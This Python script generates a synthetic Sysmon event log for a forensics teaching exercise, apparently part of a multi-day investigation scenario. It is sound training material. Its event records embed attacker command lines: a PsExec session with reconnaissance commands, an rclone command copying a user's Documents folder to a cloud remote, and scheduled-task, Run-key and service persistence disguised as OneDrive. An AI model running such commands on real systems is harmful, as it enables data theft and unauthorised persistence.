#!/usr/bin/env python3
"""mk_sysmon_log.py - write WS-ALICE's Sysmon log (.evtx) for Day 16.

Usage: python3 mk_sysmon_log.py OUTDIR

Writes OUTDIR/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx (byte-identical
on every run, standard library only), with the EVTX writer from mk_event_logs.py.

The story is the one from Days 9-15. WS-ALICE ran Sysmon with SwiftOnSecurity's sysmon-config
(sysmonconfig-export.xml), and the log holds only the events that configuration keeps for the case:
  1  process creation      every process (the config excludes only known noise)
  3  network connection    powershell.exe (an "image" rule) and anything under C:\\Users ("Usermode")
  5  process terminated    images under C:\\Users
  11 file created          .exe files, the Downloads folder, scheduled task files
  13 registry value set    Run keys ("T1060,RunKey") and service Start values ("T1031,T1050")
  15 file stream created   Zone.Identifier streams of downloads
  22 DNS query             all but an exclusion list of common domains
Events the config does not keep are absent, as they would be on the real machine: the PsExec named
pipes (17/18), the timestomping (2: the config only watches images under C:\\Users and .exe targets),
svchost.tmp (11: .tmp is not watched), the inbound SMB connection (3).

Field names, order and types follow Sysmon's schema 4.90 (`sysmon -s`) and real Sysmon events.
ProcessGuid values are built the way real ones are: groups 2-3 hold the process start time (Unix
seconds) and a LogonGuid's last groups hold the LogonId. Hashes are of the same stand-in contents
as Day 12 (powershell.exe, PSEXESVC.exe and rclone.exe match the Amcache SHA-1s); the IP addresses
come from the documentation ranges (RFC 5737). Synthetic teaching data.
"""
import datetime
import hashlib
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import mk_event_logs as m  # noqa: E402
from mk_event_logs import BOOL, GUID, HEX64, STRING, UINT16, UINT32, Event  # noqa: E402

SYSMON = "Microsoft-Windows-Sysmon"
m.PROVIDERS[SYSMON] = ("{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", None, "Microsoft-Windows-Sysmon/Operational")
FILE = "Microsoft-Windows-Sysmon%4Operational.evtx"
FIRST_RECORD = 48211
MACHINE = 0x7C41D2A9                       # first group of every GUID on WS-ALICE
WS_ALICE_IP = "10.20.30.21"

ALICE, BOB, SYSTEM = r"WS-ALICE\alice", r"WS-ALICE\bob", r"NT AUTHORITY\SYSTEM"
LOGON = {  # (user, logon id) -> (logon time, terminal session)
    (ALICE, 0x2A4F1): ("2026-09-28 07:59:05.331", 1),
    (ALICE, 0x3A1F2): ("2026-09-29 00:58:41.770", 1),
    (BOB, 0x5C1D2E): ("2026-09-29 01:05:11.442", 0),
    (SYSTEM, 0x3E7): ("2026-09-29 00:57:01.432", 0),
}
SYSMON_SERVICE = [  # (from, Sysmon64.exe PID, thread): the service restarts at every boot
    ("2026-09-28 07:58:11", 3196, 4012), ("2026-09-29 00:57:01", 3204, 4024), ("2026-09-29 07:58:18", 3188, 3960)]

PS = m.PS
RC = m.RC
RCLONE = rf"{RC}\rclone.exe"
WINVER = "10.0.26100.1 (WinBuild.160101.0800)"
MS = ("Microsoft® Windows® Operating System", "Microsoft Corporation")
IMAGES = {  # image -> (FileVersion, Description, Product, Company, OriginalFileName, stand-in content)
    PS: (WINVER, "Windows PowerShell", *MS, "PowerShell.EXE.MUI", b"powershell stand-in"),
    r"C:\Windows\System32\cmd.exe": (WINVER, "Windows Command Processor", *MS, "Cmd.Exe", b"cmd stand-in"),
    r"C:\Windows\System32\whoami.exe": (WINVER, "whoami - displays logged on user information", *MS,
                                        "whoami.exe", b"whoami stand-in"),
    r"C:\Windows\System32\net.exe": (WINVER, "Net Command", *MS, "net.exe", b"net stand-in"),
    r"C:\Windows\System32\schtasks.exe": (WINVER, "Task Scheduler Configuration Tool", *MS, "schtasks.exe",
                                          b"schtasks stand-in"),
    r"C:\Windows\System32\sc.exe": (WINVER, "Service Control Manager Configuration Tool", *MS, "sc.exe",
                                    b"sc stand-in"),
    r"C:\Windows\PSEXESVC.exe": ("2.43", "PsExec Service", "Sysinternals PsExec",
                                 "Sysinternals - www.sysinternals.com", "psexesvc.exe", b"psexesvc stand-in"),
    RCLONE: ("1.68.2", "Rsync for cloud storage", "Rclone", "https://rclone.org", "rclone.exe",
             b"MZ" + b"\0" * 8190),
}
NO_IMPHASH = "IMPHASH=00000000000000000000000000000000"   # Sysmon's value when there is no import table


def utc(when):
    return datetime.datetime.strptime(when[:19], "%Y-%m-%d %H:%M:%S").replace(tzinfo=datetime.timezone.utc)


def after(when, ms):
    """A TimeCreated string a few milliseconds after a UtcTime ('YYYY-MM-DD HH:MM:SS.fff')."""
    t = datetime.datetime.strptime(when, "%Y-%m-%d %H:%M:%S.%f") + datetime.timedelta(milliseconds=ms)
    return t.strftime("%Y-%m-%d %H:%M:%S.%f") + "4"


def guid(start, seq, tail="000000002E00"):
    t = int(utc(start).timestamp())
    s = seq.to_bytes(2, "little").hex().upper()
    return f"{MACHINE:08X}-{t & 0xFFFF:04X}-{t >> 16:04X}-{s}-{tail}"


def logon_guid(p):
    t = int(utc(p.logon_time).timestamp())
    lid = p.logon_id.to_bytes(8, "little").hex().upper()
    return f"{MACHINE:08X}-{t & 0xFFFF:04X}-{t >> 16:04X}-{lid[:4]}-{lid[4:]}"


def hashes(content):
    return (f"MD5={hashlib.md5(content).hexdigest().upper()},"
            f"SHA256={hashlib.sha256(content).hexdigest().upper()},{NO_IMPHASH}")


class Proc:
    def __init__(self, start, pid, image, cmdline, user, logon_id, *, seq, cwd, integrity="High", parent=None,
                 logon_time=None):
        self.start, self.pid, self.image, self.cmdline = start, pid, image, cmdline
        self.logon_time = logon_time or LOGON[(user, logon_id)][0]
        self.user, self.logon_id, self.cwd, self.integrity, self.parent = user, logon_id, cwd, integrity, parent
        self.guid = guid(start, seq, "000000000000" if pid == 4 else "000000002E00")


def sysmon(utctime, eid, version, fields, written_ms=2):
    when = after(utctime, written_ms)
    pid, tid = [(p, t) for since, p, t in SYSMON_SERVICE if when >= since][-1]
    return Event(when, SYSMON, eid, fields, version=version, level=4, task=eid, keywords=0x8000000000000000,
                 pid=pid, tid=tid, user="S-1-5-18")


def process_create(p):
    ver, desc, product, company, original, content = IMAGES[p.image]
    q = p.parent
    return sysmon(p.start, 1, 5, [
        ("RuleName", STRING, "-"), ("UtcTime", STRING, p.start), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image), ("FileVersion", STRING, ver),
        ("Description", STRING, desc), ("Product", STRING, product), ("Company", STRING, company),
        ("OriginalFileName", STRING, original), ("CommandLine", STRING, p.cmdline),
        ("CurrentDirectory", STRING, p.cwd), ("User", STRING, p.user),
        ("LogonGuid", GUID, logon_guid(p)), ("LogonId", HEX64, p.logon_id),
        ("TerminalSessionId", UINT32, LOGON[(p.user, p.logon_id)][1]), ("IntegrityLevel", STRING, p.integrity),
        ("Hashes", STRING, hashes(content)), ("ParentProcessGuid", GUID, q.guid), ("ParentProcessId", UINT32, q.pid),
        ("ParentImage", STRING, q.image), ("ParentCommandLine", STRING, q.cmdline), ("ParentUser", STRING, q.user)])


def process_terminate(utctime, p):
    return sysmon(utctime, 5, 3, [
        ("RuleName", STRING, "-"), ("UtcTime", STRING, utctime), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image), ("User", STRING, p.user)])


def network(utctime, p, rule, sport, dip, dport):
    return sysmon(utctime, 3, 5, [
        ("RuleName", STRING, rule), ("UtcTime", STRING, utctime), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image), ("User", STRING, p.user),
        ("Protocol", STRING, "tcp"), ("Initiated", BOOL, True), ("SourceIsIpv6", BOOL, False),
        ("SourceIp", STRING, WS_ALICE_IP), ("SourceHostname", STRING, "WS-ALICE"), ("SourcePort", UINT16, sport),
        ("SourcePortName", STRING, "-"), ("DestinationIsIpv6", BOOL, False), ("DestinationIp", STRING, dip),
        ("DestinationHostname", STRING, "-"), ("DestinationPort", UINT16, dport),
        ("DestinationPortName", STRING, "https")], written_ms=40)


def dns(utctime, p, name, address):
    return sysmon(utctime, 22, 5, [
        ("RuleName", STRING, "-"), ("UtcTime", STRING, utctime), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("QueryName", STRING, name), ("QueryStatus", STRING, "0"),
        ("QueryResults", STRING, f"::ffff:{address};"), ("Image", STRING, p.image), ("User", STRING, p.user)],
        written_ms=11)


def file_create(utctime, p, target, rule):
    return sysmon(utctime, 11, 2, [
        ("RuleName", STRING, rule), ("UtcTime", STRING, utctime), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image), ("TargetFilename", STRING, target),
        ("CreationUtcTime", STRING, utctime), ("User", STRING, p.user)])


def stream_create(utctime, p, target, content):
    return sysmon(utctime, 15, 2, [
        ("RuleName", STRING, "-"), ("UtcTime", STRING, utctime), ("ProcessGuid", GUID, p.guid),
        ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image), ("TargetFilename", STRING, target),
        ("CreationUtcTime", STRING, utctime), ("Hash", STRING, hashes(content)),
        ("Contents", STRING, content.decode().replace("\r\n", "  ")), ("User", STRING, p.user)], written_ms=6)


def reg_set(utctime, p, rule, target, details):
    return sysmon(utctime, 13, 2, [
        ("RuleName", STRING, rule), ("EventType", STRING, "SetValue"), ("UtcTime", STRING, utctime),
        ("ProcessGuid", GUID, p.guid), ("ProcessId", UINT32, p.pid), ("Image", STRING, p.image),
        ("TargetObject", STRING, target), ("Details", STRING, details), ("User", STRING, p.user)])


def events():
    system = Proc("2026-09-29 00:57:01.432", 4, "System", "", SYSTEM, 0x3E7, seq=0x03EB, cwd="")
    services = Proc("2026-09-29 00:57:05.118", 680, r"C:\Windows\System32\services.exe",
                    r"C:\Windows\system32\services.exe", SYSTEM, 0x3E7, seq=0x000B, cwd="")
    services2 = Proc("2026-09-29 07:58:19.664", 680, services.image, services.cmdline, SYSTEM, 0x3E7, seq=0x000B,
                     cwd="", logon_time="2026-09-29 07:58:18.506")
    schedule = Proc("2026-09-29 00:57:06.052", 1540, r"C:\Windows\System32\svchost.exe",
                    r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule", SYSTEM, 0x3E7, seq=0x0021, cwd="")
    edge = Proc("2026-09-29 00:59:12.774", 6420, r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window',
                ALICE, 0x3A1F2, seq=0x0118, cwd="")
    explorer28 = Proc("2026-09-28 07:59:08.412", 0x1394, r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE",
                      ALICE, 0x2A4F1, seq=0x00E4, cwd="")
    explorer29 = Proc("2026-09-29 00:58:44.105", 0x15C8, explorer28.image, explorer28.cmdline, ALICE, 0x3A1F2,
                      seq=0x00E7, cwd="")
    home, sys32 = "C:\\Users\\alice\\", "C:\\Windows\\system32\\"
    ps28 = Proc("2026-09-28 10:13:41.209", 0x1E88, PS, f'"{PS}" ', ALICE, 0x2A4F1, seq=0x0204, cwd=home,
                parent=explorer28)
    psexesvc = Proc("2026-09-29 01:05:12.615", 0x1B7C, r"C:\Windows\PSEXESVC.exe", r"C:\Windows\PSEXESVC.exe",
                    SYSTEM, 0x3E7, seq=0x01A2, cwd=sys32, integrity="System", parent=services)
    cmd = Proc("2026-09-29 01:05:14.002", 0x2368, r"C:\Windows\System32\cmd.exe", '"cmd"', BOB, 0x5C1D2E,
               seq=0x01A5, cwd=sys32, parent=psexesvc)
    whoami = Proc("2026-09-29 01:05:20.441", 0x0E50, r"C:\Windows\System32\whoami.exe", "whoami  /all", BOB,
                  0x5C1D2E, seq=0x01A8, cwd=sys32, parent=cmd)
    net = Proc("2026-09-29 01:05:44.907", 0x2D30, r"C:\Windows\System32\net.exe", "net  localgroup administrators",
               BOB, 0x5C1D2E, seq=0x01AB, cwd=sys32, parent=cmd)
    ps = Proc("2026-09-29 01:09:31.512", 0x2F14, PS, '"powershell.exe" -w hidden -nop', ALICE, 0x3A1F2, seq=0x01C3,
              cwd=home, parent=explorer29)
    rclone = Proc("2026-09-29 01:12:47.662", 0x2B60, RCLONE,
                  rf'"{RCLONE}" copy C:\Users\alice\Documents remote:drop --config {RC}\rc.conf', ALICE, 0x3A1F2,
                  seq=0x01D0, cwd=home, parent=ps)
    schtasks = Proc("2026-09-29 01:21:05.118", 0x2C8C, r"C:\Windows\System32\schtasks.exe",
                    rf'"C:\Windows\system32\schtasks.exe" /create /tn OneDriveUpdate /xml {RC}\task.xml', ALICE,
                    0x3A1F2, seq=0x01F6, cwd=home, parent=ps)
    sc_create = Proc("2026-09-29 01:22:10.499", 0x1F50, r"C:\Windows\System32\sc.exe",
                     f'"C:\\Windows\\system32\\sc.exe" create OneDriveSync binPath= "{m.SYNC_CMD}" start= auto '
                     'DisplayName= "OneDrive Sync Helper"', ALICE, 0x3A1F2, seq=0x01FB, cwd=home, parent=ps)
    sc_start = Proc("2026-09-29 01:22:11.021", 0x2470, sc_create.image,
                    '"C:\\Windows\\system32\\sc.exe" start OneDriveSync', ALICE, 0x3A1F2, seq=0x01FD, cwd=home,
                    parent=ps)
    svc_rclone = Proc("2026-09-29 01:22:11.198", 0x0F2C, RCLONE, m.SYNC_CMD, SYSTEM, 0x3E7, seq=0x01FF, cwd=sys32,
                      integrity="System", parent=services)
    boot_rclone = Proc("2026-09-29 07:58:21.300", 0x0B54, RCLONE, m.SYNC_CMD, SYSTEM, 0x3E7, seq=0x0042, cwd=sys32,
                       integrity="System", parent=services2, logon_time="2026-09-29 07:58:18.506")
    zone = b"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=http://203.0.113.50/payload.ps1\r\n"
    run_key = r"HKU\S-1-5-21-3623811015-3361044348-30300820-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    return [
        process_create(ps28),
        dns("2026-09-28 10:13:44.802", ps28, "downloads.example.net", "198.51.100.23"),
        network("2026-09-28 10:13:44.915", ps28, "-", 51344, "198.51.100.23", 443),
        file_create("2026-09-28 10:14:22.004", ps28, RCLONE, "EXE"),
        file_create("2026-09-29 01:02:03.118", edge, r"C:\Users\alice\Downloads\payload.ps1", "Downloads"),
        stream_create("2026-09-29 01:02:03.121", edge, r"C:\Users\alice\Downloads\payload.ps1:Zone.Identifier", zone),
        file_create("2026-09-29 01:05:11.981", system, r"C:\Windows\PSEXESVC.exe", "EXE"),
        reg_set("2026-09-29 01:05:12.073", services, "T1031,T1050",
                r"HKLM\System\CurrentControlSet\Services\PSEXESVC\Start", "DWORD (0x00000003)"),
        process_create(psexesvc),
        process_create(cmd),
        process_create(whoami),
        process_create(net),
        process_create(ps),
        process_create(rclone),
        dns("2026-09-29 01:12:48.390", rclone, "g.api.mega.co.nz", "198.51.100.77"),
        network("2026-09-29 01:12:48.512", rclone, "Usermode", 52817, "198.51.100.77", 443),
        process_terminate("2026-09-29 01:15:38.207", rclone),
        process_create(schtasks),
        file_create("2026-09-29 01:21:05.440", schedule, r"C:\Windows\System32\Tasks\OneDriveUpdate", "T1053"),
        reg_set("2026-09-29 01:21:29.891", ps, "T1060,RunKey", run_key + r"\OneDriveUpdate", m.SYNC_CMD),
        process_create(sc_create),
        reg_set("2026-09-29 01:22:10.555", services, "T1031,T1050",
                r"HKLM\System\CurrentControlSet\Services\OneDriveSync\Start", "DWORD (0x00000002)"),
        process_create(sc_start),
        process_create(svc_rclone),
        process_terminate("2026-09-29 01:22:11.637", svc_rclone),
        process_create(boot_rclone),
        process_terminate("2026-09-29 07:58:21.742", boot_rclone),
    ]


def main(outdir):
    logs = os.path.join(outdir, "Windows", "System32", "winevt", "Logs")
    os.makedirs(logs, exist_ok=True)
    p = os.path.join(logs, FILE)
    evs = events()
    m.write_evtx(p, evs, FIRST_RECORD)
    t = (m.ft(max(e.when for e in evs)) - 116444736000000000) / 10_000_000
    os.utime(p, (t, t))
    print(f"{os.path.getsize(p):7d}  {len(evs):3d} events  {FILE}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    main(sys.argv[1])
